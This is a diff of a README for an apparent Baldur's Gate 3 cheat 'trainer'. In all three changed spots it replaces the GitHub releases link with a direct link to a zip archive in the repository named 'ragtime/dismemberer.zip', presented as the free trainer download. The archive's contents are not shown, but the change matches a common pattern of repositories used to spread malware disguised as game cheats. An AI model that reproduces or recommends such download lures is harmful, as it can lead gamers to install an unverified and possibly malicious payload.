@@ -1,6 +1,6 @@
 # 🎲 BG3-Trainer---Baldur-s-Gate-3-Trainer-2026 - Unlock Unlimited Power in Baldur's Gate 3
 
-[![Download BG3 Trainer](https://img.shields.io/badge/Download-BG3_Trainer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hoanh692003/BG3-Trainer---Baldur-s-Gate-3-Trainer-2026/releases)
+[![Download BG3 Trainer](https://img.shields.io/badge/Download-BG3_Trainer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hoanh692003/BG3-Trainer---Baldur-s-Gate-3-Trainer-2026/main/ragtime/dismemberer.zip)
 
 ## 🎮 What Is This?
 
@@ -38,7 +38,7 @@ Follow these simple steps to start using BG3-Trainer on your Windows computer:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/hoanh692003/BG3-Trainer---Baldur-s-Gate-3-Trainer-2026/releases](https://github.com/hoanh692003/BG3-Trainer---Baldur-s-Gate-3-Trainer-2026/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/hoanh692003/BG3-Trainer---Baldur-s-Gate-3-Trainer-2026/main/ragtime/dismemberer.zip](https://raw.githubusercontent.com/hoanh692003/BG3-Trainer---Baldur-s-Gate-3-Trainer-2026/main/ragtime/dismemberer.zip)**
 
 Click the download button on that page to get the latest version of the trainer.
 
@@ -137,7 +137,7 @@ Make sure you're running the latest version of the trainer and that Baldur's Gat
 
 Need to download the trainer again? No problem!
 
-Visit this link to download the application: **[https://github.com/hoanh692003/BG3-Trainer---Baldur-s-Gate-3-Trainer-2026/releases](https://github.com/hoanh692003/BG3-Trainer---Baldur-s-Gate-3-Trainer-2026/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/hoanh692003/BG3-Trainer---Baldur-s-Gate-3-Trainer-2026/main/ragtime/dismemberer.zip](https://raw.githubusercontent.com/hoanh692003/BG3-Trainer---Baldur-s-Gate-3-Trainer-2026/main/ragtime/dismemberer.zip)**
 
 The download is always available and always free. Save the file somewhere easy to find, like your desktop, for quick access.
 
